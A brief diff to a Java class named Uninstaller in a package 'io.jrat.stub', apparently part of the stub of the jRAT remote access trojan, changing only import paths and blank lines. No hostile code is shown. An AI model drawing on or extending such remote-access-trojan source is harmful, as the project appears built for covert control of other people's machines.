@@ -1,13 +1,11 @@
 package io.jrat.stub;
 
 import io.jrat.common.utils.Utils;
-
 import java.io.File;
 import java.io.FileWriter;
 import java.util.Random;
-
-import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.Shell;
+import oslib.OperatingSystem;
+import oslib.Shell;
 
 public class Uninstaller extends Thread {
 	
